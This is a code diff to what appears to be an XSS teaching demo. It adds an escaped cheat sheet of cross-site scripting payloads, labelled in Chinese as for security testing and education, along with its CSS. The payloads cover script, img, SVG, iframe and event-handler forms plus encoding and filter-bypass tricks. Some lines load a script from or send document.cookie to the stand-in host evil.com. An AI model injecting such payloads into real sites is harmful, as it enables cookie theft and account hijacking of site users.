@@ -58,6 +58,103 @@
             <code v-html="highlightCode(userInput)"></code>
           </div>
         </div>
+
+        <div class="cheatsheet-box">
+          <h4>🔖 XSS Payloads Cheat Sheet</h4>
+          <p class="cheat-subtitle">常见的 XSS 攻击载荷（仅用于安全测试与教育）</p>
+
+          <div class="payload-section">
+            <h5>基础 Script 标签：</h5>
+            <ul class="payload-list">
+              <li><code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></li>
+              <li><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></li>
+              <li><code>&lt;script&gt;alert(document.domain)&lt;/script&gt;</code></li>
+              <li><code>&lt;script src="http://evil.com/xss.js"&gt;&lt;/script&gt;</code></li>
+              <li><code>&lt;script&gt;fetch('http://evil.com?c='+document.cookie)&lt;/script&gt;</code></li>
+            </ul>
+          </div>
+
+          <div class="payload-section">
+            <h5>IMG 标签利用：</h5>
+            <ul class="payload-list">
+              <li><code>&lt;img src=x onerror=alert('XSS')&gt;</code></li>
+              <li><code>&lt;img src=x onerror="alert(document.cookie)"&gt;</code></li>
+              <li><code>&lt;img src=javascript:alert('XSS')&gt;</code></li>
+              <li><code>&lt;img src="" onerror="location='http://evil.com'"&gt;</code></li>
+              <li><code>&lt;img/src/onerror=alert(1)&gt;</code></li>
+            </ul>
+          </div>
+
+          <div class="payload-section">
+            <h5>事件处理器：</h5>
+            <ul class="payload-list">
+              <li><code>&lt;body onload=alert('XSS')&gt;</code></li>
+              <li><code>&lt;input onfocus=alert('XSS') autofocus&gt;</code></li>
+              <li><code>&lt;select onfocus=alert('XSS') autofocus&gt;</code></li>
+              <li><code>&lt;textarea onfocus=alert('XSS') autofocus&gt;</code></li>
+              <li><code>&lt;div onmouseover="alert('XSS')"&gt;Hover me&lt;/div&gt;</code></li>
+            </ul>
+          </div>
+
+          <div class="payload-section">
+            <h5>SVG 利用：</h5>
+            <ul class="payload-list">
+              <li><code>&lt;svg onload=alert('XSS')&gt;</code></li>
+              <li><code>&lt;svg/onload=alert('XSS')&gt;</code></li>
+              <li><code>&lt;svg&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;&lt;/svg&gt;</code></li>
+              <li><code>&lt;svg&gt;&lt;animate onbegin=alert('XSS')/&gt;</code></li>
+            </ul>
+          </div>
+
+          <div class="payload-section">
+            <h5>iframe 利用：</h5>
+            <ul class="payload-list">
+              <li><code>&lt;iframe src="javascript:alert('XSS')"&gt;&lt;/iframe&gt;</code></li>
+              <li><code>&lt;iframe src=data:text/html,&lt;script&gt;alert('XSS')&lt;/script&gt;&gt;</code></li>
+              <li><code>&lt;iframe onload=alert('XSS')&gt;&lt;/iframe&gt;</code></li>
+            </ul>
+          </div>
+
+          <div class="payload-section">
+            <h5>HTML5 新标签：</h5>
+            <ul class="payload-list">
+              <li><code>&lt;video src=x onerror=alert('XSS')&gt;</code></li>
+              <li><code>&lt;audio src=x onerror=alert('XSS')&gt;</code></li>
+              <li><code>&lt;details open ontoggle=alert('XSS')&gt;</code></li>
+              <li><code>&lt;marquee onstart=alert('XSS')&gt;XSS&lt;/marquee&gt;</code></li>
+            </ul>
+          </div>
+
+          <div class="payload-section">
+            <h5>链接利用：</h5>
+            <ul class="payload-list">
+              <li><code>&lt;a href="javascript:alert('XSS')"&gt;Click&lt;/a&gt;</code></li>
+              <li><code>&lt;a href="data:text/html,&lt;script&gt;alert('XSS')&lt;/script&gt;"&gt;Click&lt;/a&gt;</code></li>
+              <li><code>&lt;form action="javascript:alert('XSS')"&gt;&lt;button&gt;Submit&lt;/button&gt;&lt;/form&gt;</code></li>
+            </ul>
+          </div>
+
+          <div class="payload-section">
+            <h5>编码绕过：</h5>
+            <ul class="payload-list">
+              <li><code>&lt;img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;"&gt;</code></li>
+              <li><code>&lt;img src=x onerror="\u0061\u006c\u0065\u0072\u0074('XSS')"&gt;</code></li>
+              <li><code>&lt;script&gt;\u0061\u006c\u0065\u0072\u0074('XSS')&lt;/script&gt;</code></li>
+              <li><code>&lt;img src=x onerror="eval(atob('YWxlcnQoJ1hTUycp'))"&gt;</code></li>
+            </ul>
+          </div>
+
+          <div class="payload-section">
+            <h5>绕过过滤器：</h5>
+            <ul class="payload-list">
+              <li><code>&lt;ScRiPt&gt;alert('XSS')&lt;/sCrIpT&gt;</code></li>
+              <li><code>&lt;img/src="x"/onerror="alert('XSS')"&gt;</code></li>
+              <li><code>&lt;svg&gt;&lt;script&gt;alert&amp;#40;'XSS'&amp;#41;&lt;/script&gt;</code></li>
+              <li><code>&lt;img src=`x` onerror=`alert('XSS')`&gt;</code></li>
+              <li><code>&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;</code></li>
+            </ul>
+          </div>
+        </div>
       </div>
     </div>
 
@@ -225,6 +322,77 @@ const highlightCode = (text) => {
 
 .unsafe-output-demo {
   border: 2px solid #ff6b6b;
+}
+
+.cheatsheet-box {
+  background: rgba(0, 0, 0, 0.4);
+  padding: 25px;
+  border-radius: 8px;
+  margin: 30px 0;
+  border: 3px solid #ffd700;
+  box-shadow: 0 0 20px rgba(255, 215, 0, 0.3);
+}
+
+.cheatsheet-box h4 {
+  color: #ffd700;
+  font-size: 1.8em;
+  margin-top: 0;
+  margin-bottom: 10px;
+  text-align: center;
+  text-shadow: 0 0 10px rgba(255, 215, 0, 0.5);
+}
+
+.cheat-subtitle {
+  text-align: center;
+  color: #ffffff;
+  opacity: 0.9;
+  margin-bottom: 20px;
+  font-size: 1.1em;
+}
+
+.payload-section {
+  background: rgba(30, 30, 30, 0.6);
+  padding: 15px;
+  border-radius: 5px;
+  margin: 15px 0;
+  border-left: 3px solid #4ec9b0;
+}
+
+.payload-section h5 {
+  color: #4ec9b0;
+  font-size: 1.2em;
+  margin-top: 0;
+  margin-bottom: 12px;
+  border-bottom: 1px solid rgba(78, 201, 176, 0.3);
+  padding-bottom: 8px;
+}
+
+.payload-list {
+  list-style: none;
+  padding: 0;
+  margin: 0;
+}
+
+.payload-list li {
+  margin: 8px 0;
+  padding: 8px;
+  background: rgba(0, 0, 0, 0.3);
+  border-radius: 4px;
+  transition: all 0.2s ease;
+}
+
+.payload-list li:hover {
+  background: rgba(78, 201, 176, 0.1);
+  border-left: 3px solid #4ec9b0;
+  padding-left: 12px;
+  transform: translateX(5px);
+}
+
+.payload-list code {
+  color: #ff6b6b;
+  font-family: 'Courier New', monospace;
+  font-size: 0.95em;
+  word-break: break-all;
 }
 
 .footer {
